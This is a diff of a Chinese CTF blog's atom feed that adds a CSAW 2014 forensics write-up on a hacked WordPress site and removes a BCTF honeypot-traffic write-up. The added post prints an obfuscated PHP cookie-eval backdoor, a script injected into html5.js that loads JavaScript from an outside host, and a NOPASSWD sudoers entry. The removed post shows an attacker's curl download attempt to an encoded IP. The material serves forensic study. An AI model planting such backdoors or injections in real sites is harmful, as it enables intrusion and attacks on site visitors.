@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | Jeffxx Blog]]></title>
   <link href="http://jeffxx.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://jeffxx.github.io/"/>
-  <updated>2014-08-13T21:13:52+08:00</updated>
+  <updated>2014-09-24T22:35:12+08:00</updated>
   <id>http://jeffxx.github.io/</id>
   <author>
     <name><![CDATA[cychao]]></name>
@@ -12,6 +12,89 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW CTF 2014 Forensics 300 Fluffy No More Write-up]]></title>
+    <link href="http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up/"/>
+    <updated>2014-09-24T21:15:06+08:00</updated>
+    <id>http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up</id>
+    <content type="html"><![CDATA[<p><img src="/images/writeup/csaw2014_taskboard.png"></p>
+
+<p>最近實在太忙了,請容許我的 Defcon 下集繼續拖稿, 趁剛打完 CTF 記憶猶新先寫write-upXD</p>
+
+<p>CSAW CTF 是給大學生打的CTF, 只允許純大學生的隊伍參加決賽,冠軍獎金不少,吸引了不少強者參加.
+一年之中最適合初學者參加的CTF非他莫屬, 題目平易近人,就算只會google也可以拿到幾百分.</p>
+
+<p>本次 Write-up 選擇 Foensics 300 , 除了題目設計的很像真實發生的資安事件外, 最重要的是我們在最後一步卡了四五個小時, 必須好好記錄下來避免再次犯錯.</p>
+
+<!--  more -->
+
+
+<p><img src="/images/writeup/csaw2014_f300.png">
+<a href="https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more">題目備份</a></p>
+
+<p>大意就是有個人的網站被駭了,許多該網站的使用者受到影響,站長已經將 伺服器的設定檔(/etc),網站(web root directory), 日誌 (/var/log) , 資料庫 (sql)
+全部備分出來,請你協助調查發生了什麼事情.</p>
+
+<p>做這種事件調查時, 幾個資訊要先釐清 發生的大概時間, 攻擊來源, 影響範圍等. 遺憾的是真的發生事件時這些重要資訊大概都沒有,跟題目一樣(汗)</p>
+
+<p>因此我從 http access log 看起 , 濾掉 404  , css , js 的 query . 再檢查一下 useragent 會發現有幾個大量使用 scanner 的 IP , 但都不是我們要找的目標.</p>
+
+<p>此時atdog直接去翻網頁目錄, 看到是wordpress就直接往 plugin / upload 找,直接就找到後門.</p>
+
+<p><img src="/images/writeup/csaw2014_f300_backdoor.png"></p>
+
+<p>事後我們猜測這邊應該是要先去看wordpress用的plugin,會看到 wysija  然後google wysija exploit會找到 <a href="http://www.exploit-db.com/exploits/33991/">任意檔案上傳漏洞</a> , 從攻擊payload裡面可以抓出特徵,再去log裡面找到攻擊者IP及上傳的後門</p>
+
+<p><img src="/images/writeup/csaw2014_f300_exploit.png"></p>
+
+<p>回歸正題, backdoor 被混淆過,簡單把最後一行的最外層變數改成echo就可以拿到最後執行的php command</p>
+
+<p>```php
+$c=&lsquo;count&rsquo;;
+$a=$_COOKIE;
+if(reset($a)==&lsquo;ha&rsquo; &amp;&amp; $c($a)>3){</p>
+
+<pre><code>  $k='ckit';echo '&lt;'.$k.'&gt;';
+  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
+  echo '&lt;/'.$k.'&gt;';
+</code></pre>
+
+<p>}
+<code>
+由於駭客很賤的把命令藏在cookie裡, 所以無法從log還原出下的指令, 只能根據時間去檢查系統設定檔修改時間. 很幸運的我們有整個/etc, 有正確的時間點我們很快找出被駭客動過的檔案, 用IP去grep log也會看到很多嘗試登入系統的動作.
+</code></p>
+
+<h1>cat etc/sudoers.d/casper</h1>
+
+<p>ubuntu  ALL=(ALL) NOPASSWD: ALL
+```</p>
+
+<p>看到這邊再回頭看auth.log就會發現那一系列的sudo command有部分應該是hacker下的, 其中一行vi html5.js特別可疑
+```</p>
+
+<h1>cat auth.log  | grep vi</h1>
+
+<p>Sep 17 17:17:51 ubuntu sudo:   ubuntu : TTY=unknown ; PWD=/ ; USER=ubuntu ; COMMAND=/usr/bin/gsettings get org.gnome.nautilus.desktop volumes-visible
+Sep 17 17:17:59 ubuntu sudo:   ubuntu : TTY=unknown ; PWD=/ ; USER=ubuntu ; COMMAND=/usr/bin/gsettings set org.gnome.nautilus.desktop volumes-visible false
+Sep 17 17:18:08 ubuntu gnome-keyring-daemon[4914]: couldn&rsquo;t set environment variable in session: Setenv interface is only available during the Initialization phase
+Sep 17 17:22:19 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-get install lamp-server^ vim
+Sep 17 17:24:52 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/vi /etc/hosts
+Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
+```
+去將原版twentythirteen的html5.js抓下來比對會發現多一行:</p>
+
+<p><code>
+if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d&lt;h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document); var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i&lt;f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i&lt;c.length;i++){if(((i==3||i==6)&amp;&amp;w!=2)||((i==8)&amp;&amp;w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("&lt;"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'&gt;\&lt;/"+m+"\&gt;");
+</code></p>
+
+<p>直接丟進瀏覽器的開發者工具執行,會被導到一個 <a href="http://128.238.66.100/announcement.pdf">PDF</a>  然後我們用pdfdump, hexedit, 010edit都看不出個所以然,回頭又繼續翻log. 找各種蛛絲馬跡.</p>
+
+<p>浪費了幾個小時,還一度以為右下角的imgurl是線索,要去imgurl找出作圖的作者.最後發現是 pdfdump -raw的output不會decode,用pdfdump -b -i 8 就直接看到javascript跟key了&hellip;</p>
+
+<p>CTF結束後看別人的 <a href="https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more">Write-up</a> , <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=57">PDF streaming dump</a> 比 <a href="http://www.unixuser.org/~euske/python/pdfminer/">dumppdf</a>更強大,要學起來.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Defcon 22 Final HITCON 參賽心得 (上)]]></title>
@@ -479,183 +562,6 @@ sqlmap -u <a href="http://backdoor.cognizance.org.in/problems/web300/check.php">
 --dump-all 撈所有資料 再bool-based底下會很慢
 --threads 指定同時run幾隻 加快速度
 </code></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[BCTF Misc300 Write Up]]></title>
-    <link href="http://jeffxx.github.io/blog/2014/03/14/bctf-misc300-write-up/"/>
-    <updated>2014-03-14T21:42:29+08:00</updated>
-    <id>http://jeffxx.github.io/blog/2014/03/14/bctf-misc300-write-up</id>
-    <content type="html"><![CDATA[<p>感冒在家養病逛fb, 突然看到有ctf可以打
-馬上開skype問帳號開打XD</p>
-
-<p>直接找一題沒人解的來玩</p>
-
-<p><img src="/images/writeup/bctf2014_misc300_problem.png"></p>
-
-<!-- more -->
-
-
-<p>下載檔案可以看到疑似封包內容的 in out stream</p>
-
-<p><code>`` python
-stream = [('in', b'\x00\x00\x00T\xffSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18n\x001\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00'),
-('out', b'\x00\x00\x00U\xffSMBr\x00\x00\x00\x00\x98\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x86\xe8\x00\x00\x18n\x11\x03\x00\x03\x01\x00\x01\x00\x00\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\xfd\xe3\x00\x80\xb3\x13"\xd7L#\xcf\x01\xc4\xff\x00\x10\x00\x0b\xffe8T~lB\xa4&gt;\x12\xd2\x11\x97\x16D'),
-('in', b'\x00\x00\x00\xb1\xffSMBs\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18n\x0c\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00S\x00\x00\x00\x00\x00\xd4\x00\x00\x80v\x00</code>Q\x06\x06+\x06\x01\x05\x05\x02\xa0G0E\xa0\x0e0\x0c\x06\x0a+\x06\x01\x04\x01\x827\x02\x02\x0a\xa23\x041NTLMSSP\x00\x01\x00\x00\x00\x05\x02\x88\xa2\x01\x00\x01\x00 \x00\x00\x00\x10\x00\x10\x00!\x00\x00\x00.AYplsysIiHy9uvbXWindows 2000 2195\x00Windows 2000 5.0\x00'),
-(&lsquo;out&rsquo;, b'\x00\x00\x00\xad\xffSMBs\x16\x00\x00\xc0\x98\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x86\xe8\x00\x00\x18n\x04\xff\x00\x00\x00\x00\x00S\x00\x82\x00\xa1Q0O\xa0\x03\x0a\x01\x01\xa1\x0c\x06\x0a+\x06\x01\x04\x01\x827\x02\x02\x0a\xa2:\x048NTLMSSP\x00\x02\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x05\x02\x88\xa2\xa4\xdf\xe8\x0b\xf5\xc6\x1e:\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x05\x01(\x0a\x00\x00\x00\x0fWindows 5.1\x00Windows 2000 LAN Manager\x00WORKGROUP\x00'),
-(&lsquo;in&rsquo;, b'\x00\x00\x01_\xffSMBs\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18n\x0c\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x5c\xd0\x00\x80$\x01\xa1\x81\xfe0\x81\xfb\xa2\x81\xf8\x04\x81\xf5NTLMSSP\x00\x03\x00\x00\x00\x18\x00\x18\x00@\x00\x00\x00z\x00z\x00X\x00\x00\x00\x02\x00\x02\x00\xd2\x00\x00\x00\x00\x00\x00\x00\xd4\x00\x00\x00 \x00 \x00\xd4\x00\x00\x00\x00\x00\x00\x00\xf4\x00\x00\x00\x05\x02\x88\xa2L\xc8\x1d\xb4s\xfa\xb4M\xc0\xa5F\xad\xb8\x16\x81\x89\xda\x87\x7f\x903\xd6hd\x0aS%4J\x08\xfa\x82E~\xc8R\xf3SW\xa3\x01\x01\x00\x00\x00\x00\x00\x00\x00m"y\xef\x27\xcf\x01\xda\x87\x7f\x903\xd6hd\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\x07\x00\x08\x00\x00m"y\xef\x27\xcf\x01\x09\x00&amp;\x00c\x00i\x00f\x00s\x00/\x002\x001\x001\x00.\x006\x005\x00.\x001\x009\x003\x00.\x002\x004\x008\x00\x00\x00\x00\x00\x00\x00\x00\x00.\x00A\x00Y\x00p\x00l\x00s\x00y\x00s\x00I\x00i\x00H\x00y\x009\x00u\x00v\x00b\x00X\x00\x00Windows 2000 2195\x00Windows 2000 5.0\x00'),</p>
-
-<p>```</p>
-
-<p>每行都有SMB很明顯了, 翻翻 SMB header 定義</p>
-
-<p><a href="http://msdn.microsoft.com/en-us/library/ee441774.aspx">http://msdn.microsoft.com/en-us/library/ee441774.aspx</a></p>
-
-<p>Protocol (4 bytes): This field MUST contain the 4-byte literal string &lsquo;\xFF&rsquo;, &rsquo;S', &rsquo;M', &lsquo;B&rsquo;, with the letters represented by their respective ASCII values in the order shown. In the earliest available SMB documentation, this field is defined as a one byte message type (0xFF) followed by a three byte server type identifier.</p>
-
-<p>前面好像還包一層, 但不重要, 重要的是沒有前兩層的header  wireshark打不開</p>
-
-<p>剩下兩條路走.</p>
-
-<ol>
-<li><p>自己parse smb protocol 或找現成的parser</p></li>
-<li><p>包前兩層讓wireshark看得懂</p></li>
-</ol>
-
-
-<p>1.找不到現成的parser, 自己parse有點懶</p>
-
-<p>後來看到wireshark 有個tool是 text2pcap可以幫忙補上L2, L3的header</p>
-
-<p>但是在這邊卡了一段時間,因text2pcap一直沒有如預期的把內容塞進去</p>
-
-<p>man裡面明明說</p>
-
-<p>```
-Here is a sample dump that</p>
-
-<pre><code>   text2pcap can recognize:
-
-       000000 00 e0 1e a7 05 6f 00 10 ........
-       000008 5a a0 b9 12 08 00 46 00 ........
-</code></pre>
-
-<p>```</p>
-
-<p>結果他不認得,只會噴1 potential packet wrote 0 packet.</p>
-
-<p><code>console
-Input from: demo
-Output to: demo.pcap
-Output format: PCAP
-Generate dummy Ethernet header: Protocol: 0x800
-Generate dummy IP header: Protocol: 6
-Generate dummy TCP header: Source port: 139. Dest port: 139
-Read 1 potential packet, wrote 0 packets (24 bytes).
-</code></p>
-
-<p>最後發現他其實只能吃 #od -Ax -tx1 -v &ndash; 噴出來的格式
-```</p>
-
-<h1>od -Ax -tx1 -v &ndash;</h1>
-
-<p>0000000    30  30  30  30  30  30  30  3a  20  35  63  37  38  20  33  34
-0000010    33  33  20  35  63  37  38  20  33  32  33  31  20  35  63  37
-0000020    38  20  33  30  33  31  20  35  63  37  38  20  33  30  33  30
-0000030    20  20  5c  78  34  33  5c  78  32  31  5c  78  30  31  5c  78
-```</p>
-
-<p>確定能偽造header後 用以下command把parse過的檔案轉成pcap</p>
-
-<p><code>
-od -Ax -tx1 -v input | text2pcap -T 139,139 - packet.pcap
-</code></p>
-
-<p><img src="/images/writeup/bctf2014_misc300_pcap.PNG"></p>
-
-<p>看到\BROWSER 又有叫 NetrAddAlternateComputerName</p>
-
-<p>google一下就會發現是 MS03-049</p>
-
-<p>其實在這邊我只要去把那段shellcode解出來應該就差不多了</p>
-
-<p>但找不到tool解 當時也沒想到直接在windows寫程式run他&hellip;已經不會在windows上寫程式了XD</p>
-
-<p>回頭看提示發現跟honeypot有關</p>
-
-<p>再看看檔名 <strong>dionaea</strong> ..What the fuck</p>
-
-<h1>dionaea 是一個honeypot project</h1>
-
-<p>安裝太麻煩了,直接抓honeydrive下來,再參考這篇</p>
-
-<p><a href="http://blog.moep.name/index.php?/archives/2-Detecting-malware-with-dionaea.html">http://blog.moep.name/index.php?/archives/2-Detecting-malware-with-dionaea.html</a></p>
-
-<p>replay就可以重現當時的流量,dionaea還幫你分析好是MS03-049</p>
-
-<p>```python
-[08032014 18:18:33] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 1599
-[08032014 18:18:34] SMB dionaea/smb/smb.py:405-info: got header
-[08032014 18:18:34] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 2167
-[08032014 18:18:35] SMB dionaea/smb/smb.py:405-info: got header
-[08032014 18:18:35] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 3107
-[08032014 18:18:36] SMB dionaea/smb/smb.py:405-info: got header
-[08032014 18:18:36] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 3597
-[08032014 18:18:37] SMB dionaea/smb/smb.py:405-info: got header
-[08032014 18:18:37] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 3678
-[08032014 18:18:38] SMB dionaea/smb/smb.py:405-info: got header
-[08032014 18:18:38] SMB dionaea/smb/smb.py:407-info: FragLen 4024 len(self.buf) 4024
-[08032014 18:18:38] rpcservices dionaea/smb/rpcservices.py:76-info: Calling WKSSVC NetAddAlternateComputerName (1b) maybe MS03-39 exploit?
-[08032014 18:18:39] SMB dionaea/smb/smb.py:405-info: got header
-[08032014 18:18:39] SMB dionaea/smb/smb.py:407-info: FragLen 2124 len(self.buf) 722</p>
-
-<p>```</p>
-
-<p>但大概是太久沒人解出來,主辦單位直接把難度降低 放出kippo.ttylog</p>
-
-<p>honeydrive上也有kippo</p>
-
-<p>用他的playlog.py replay 可以看到以下結果
-<code>console
-nas3:/# cd tmp/
-nas3:/tmp# ls
-nas3:/tmp# touch 1.sh
-nas3:/tmp# ls
-1.sh
-nas3:/tmp# axel 2792326331/fool
-bash: axel: command not found
-nas3:/tmp# curl 2792326331/fool
-bash: curl: command not found
-nas3:/tmp# uname -r
-Linux
-nas3:/tmp# rm 1.sh
-nas3:/tmp# exit
-</code></p>
-
-<p>這裡有個有趣的地方, 2792326331/fool</p>
-
-<p>大家都知道網址前面是 hostname 或是 IP</p>
-
-<p>但IP還可以用八進位或是16進位表示</p>
-
-<p>詳見 : <a href="http://drops.wooyun.org/papers/146">http://drops.wooyun.org/papers/146</a></p>
-
-<p>所以 2792326331/fool  其實是個網址</p>
-
-<p>抓下來是隻PE, 直接執行沒有看到寫registry或是寫檔的行為</p>
-
-<p>Reverse過程沒什麼特別的 就沒有截圖了..</p>
-
-<p>從IDA pro看有一段像是要寫registry,</p>
-
-<p>用ollydbg打開 把anti-debugging填成0x90</p>
-
-<p>就會發現該程式還會檢查參數還是什麼的,總之跳過之後</p>
-
-<p>他就會把key寫進registry裡面</p>
-
-<p><em>可惜這次重感冒+隔天要上班, 臨時打也找不到人 只有學弟陪我玩QQ</em></p>
 ]]></content>
   </entry>
   
